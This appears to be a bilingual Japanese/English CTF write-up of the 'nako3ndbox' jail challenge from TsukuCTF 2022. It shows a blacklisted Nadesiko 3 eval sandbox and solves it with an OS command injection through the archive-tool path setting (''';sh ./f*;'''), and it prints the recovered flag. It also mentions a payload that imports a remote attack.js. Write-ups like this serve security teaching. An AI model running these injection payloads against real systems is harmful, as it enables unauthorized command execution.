{"pageProps":{"postData":{"id":"nako3ndbox","contentHtml":"# nako3ndbox\n\n## 問題文\n\nに・ほ・ん・ご・で・あ・そ・ぼ\\\n`nc tsukuctf.sechack365.com 31418`\n\n## 難易度\n\n**medium**\n\n## 作問にあたって\n\nなでしこ 3 の修正済みである脆弱性を使った Jail 問題です。\\\nもともとは最新版を使い`！「http://ctf.example.com/attack.js」を取り込み`で RCE させようと思っていましたが、`ナデシコする`でうまく動かないため、見つけた脆弱性を用いる事にしました。\\\n一応、CVE-2022-41642 のバイパスなのでまだ CVE はついていません(頑張れば脆弱性なしで解けます)。\n\n## 解法\n\nなでしこ 3 を用いた Jail 問題のようだ。\\\n配布されたソースは以下のようであった。\n\n```bash\n「------------------------------------------------------------\n             _        _____           _ _\n _ __   __ _| | _____|___ / _ __   __| | |__   _____  __\n| '_ \\ / _` | |/ / _ \\ |_ \\| '_ \\ / _` | '_ \\ / _ \\ \\/ /\n| | | | (_| |   < (_) |__) | | | | (_| | |_) | (_) >  <\n|_| |_|\\__,_|_|\\_\\___/____/|_| |_|\\__,_|_.__/ \\___/_/\\_\\\n\n------------------------------------------------------------」と言う\n\n「日本語コード：」と尋ねる\nそれを入力に代入\n\nブラックリスト＝「読、開、保存、実行、起動、サーバ、フォルダ、ファイル、ナデシコ、ディレクトリ、flag」を「、」で区切る\n\nブラックリスト！＝空の間\n　　ブラックリストの０から１を配列取り出す\n　　もし（入力でそれの出現回数）！＝０ならば\n　　　　「日本語の世界からは出しませんよ！！！」と言う\n　　　　終了する\n　　ここまで\nここまで\n\n「｛入力｝」をナデシコする\n\n終了する\n```\n\n入力された文字列をブラックリストで検証し、eval にあたる`ナデシコする`で実行している。\\\nブラックリストがない場合、`「ls」を起動`などで RCE 可能だが今回は難しい。\\\nここで配布されたファイルより、なでしこ 3 が最新版でなく、3.3.67 である点に注目する。\\\nGitHub の Issues を見てやると[cnako3 の圧縮解凍の問題](https://github.com/kujirahand/nadesiko3/issues/1325)が見つかる。\\\n複数のシングルクォートを圧縮解凍系の処理に含めることで、OS コマンドインジェクションが可能なようだ。\\\nこの修正を参考に任意コード実行を行う。\\\n今回は以下のように`圧縮解凍ツールパス`の引数としてコマンドを与える。\n\n```bash\n$ nc tsukuctf.sechack365.com 31418\n------------------------------------------------------------\n             _        _____           _ _\n _ __   __ _| | _____|___ / _ __   __| | |__   _____  __\n| '_ \\ / _` | |/ / _ \\ |_ \\| '_ \\ / _` | '_ \\ / _ \\ \\/ /\n| | | | (_| |   < (_) |__) | | | | (_| | |_) | (_) >  <\n|_| |_|\\__,_|_|\\_\\___/____/|_| |_|\\__,_|_.__/ \\___/_/\\_\\\n\n------------------------------------------------------------\n日本語コード：圧縮解凍ツールパスは「'';sleep 10;'」。「」を「」へ解凍\n/bin/sh: ': not found\n/bin/sh: : Permission denied\n[実行時エラー]app(1行目): Command failed: ''\\''';sleep 10;'' x '' -o'' -y\n/bin/sh: ': not found\n/bin/sh: : Permission denied\n~~~\n```\n\n`sleep 10`を行うと 10 秒スリープした。\\\nフラグは`flag.txt`にあるので読みだせばよいが、`flag`がブラックリストにある。\\\n`./f*`などで回避してやればよい。\\\nコマンドの実行結果がなぜか出てこないことがあるので、`sh`に渡してエラーとして吐き出せばよい。\n\n```bash\n$ nc tsukuctf.sechack365.com 31418\n------------------------------------------------------------\n             _        _____           _ _\n _ __   __ _| | _____|___ / _ __   __| | |__   _____  __\n| '_ \\ / _` | |/ / _ \\ |_ \\| '_ \\ / _` | '_ \\ / _ \\ \\/ /\n| | | | (_| |   < (_) |__) | | | | (_| | |_) | (_) >  <\n|_| |_|\\__,_|_|\\_\\___/____/|_| |_|\\__,_|_.__/ \\___/_/\\_\\\n\n------------------------------------------------------------\n日本語コード：圧縮解凍ツールパスは「'';sh ./f*;'」。「」を「」へ解凍\n/bin/sh: ': not found\n./flag.txt: line 1: TsukuCTF22{y0u_jump3d_0u7_0f_j4p4n353}: not found\n/bin/sh: : Permission denied\n[実行時エラー]app(1行目): Command failed: ''\\''';sh ./f*;'' x '' -o'' -y\n/bin/sh: ': not found\n./flag.txt: line 1: TsukuCTF22{y0u_jump3d_0u7_0f_j4p4n353}: not found\n/bin/sh: : Permission denied\n~~~\n```\n\nflag が得られた。\n\n## TsukuCTF22{y0u\\_jump3d\\_0u7\\_0f\\_j4p4n353}\n\n## Abstract\n\nThis is a Jail related to a known vulnerability in なでしこ 3\nFirst I intended to make a RCE question by `！「http://ctf.example.com/attack.js」を取り込み`. However, `ナデシコする` didn't work well. Thats why I use the vulnerability instead.\n\n## Solve\n\nThis seems Jail with なでしこ 3.\nThe ditributed source code is the following.\n\n```\n```\n\n<!-- XXXX:なでしこソース追加 -->\n\nThis program execute the given strings with `ナデシコする` which corresponds to the eval command after given strings are checked.\nYou could RCE by `「ls」を起動` if it were not checked. We can't do this for this case.\nBtw, this is ver 3.3.67 which is not the latest one and this has [an issue related to cnako3](https://github.com/kujirahand/nadesiko3/issues/1325)\nThis is OS command injection. You can use this vulnerability.\n\n```bash\n$ nc tsukuctf.sechack365.com 31418\n------------------------------------------------------------\n             _        _____           _ _\n _ __   __ _| | _____|___ / _ __   __| | |__   _____  __\n| '_ \\ / _` | |/ / _ \\ |_ \\| '_ \\ / _` | '_ \\ / _ \\ \\/ /\n| | | | (_| |   < (_) |__) | | | | (_| | |_) | (_) >  <\n|_| |_|\\__,_|_|\\_\\___/____/|_| |_|\\__,_|_.__/ \\___/_/\\_\\\n\n------------------------------------------------------------\n日本語コード：圧縮解凍ツールパスは「'';sleep 10;'」。「」を「」へ解凍\n/bin/sh: ': not found\n/bin/sh: : Permission denied\n[実行時エラー]app(1行目): Command failed: ''\\''';sleep 10;'' x '' -o'' -y\n/bin/sh: ': not found\n/bin/sh: : Permission denied\n~~~\n```\n\n`sleep 10` make the thread sleep for 10 seconds.\nAs the `flag` is blacklisted, you should specify like `./f*` to get `flag.txt`.\nI don't know why but sometimes we can't get the result. So get the result as Error Message through `sh` instead.\n\n```bash\n$ nc tsukuctf.sechack365.com 31418\n------------------------------------------------------------\n             _        _____           _ _\n _ __   __ _| | _____|___ / _ __   __| | |__   _____  __\n| '_ \\ / _` | |/ / _ \\ |_ \\| '_ \\ / _` | '_ \\ / _ \\ \\/ /\n| | | | (_| |   < (_) |__) | | | | (_| | |_) | (_) >  <\n|_| |_|\\__,_|_|\\_\\___/____/|_| |_|\\__,_|_.__/ \\___/_/\\_\\\n\n------------------------------------------------------------\n日本語コード：圧縮解凍ツールパスは「'';sh ./f*;'」。「」を「」へ解凍\n/bin/sh: ': not found\n./flag.txt: line 1: TsukuCTF22{y0u_jump3d_0u7_0f_j4p4n353}: not found\n/bin/sh: : Permission denied\n[実行時エラー]app(1行目): Command failed: ''\\''';sh ./f*;'' x '' -o'' -y\n/bin/sh: ': not found\n./flag.txt: line 1: TsukuCTF22{y0u_jump3d_0u7_0f_j4p4n353}: not found\n/bin/sh: : Permission denied\n~~~\n```\n\nNow you get the FLAG.\n\n## TsukuCTF22{y0u\\_jump3d\\_0u7\\_0f\\_j4p4n353}\n","title":"nako3ndbox","description":"なでしこのサンドボックス問題","author":"Satoki","genre":"Misc","solver":6,"point":500}},"__N_SSG":true}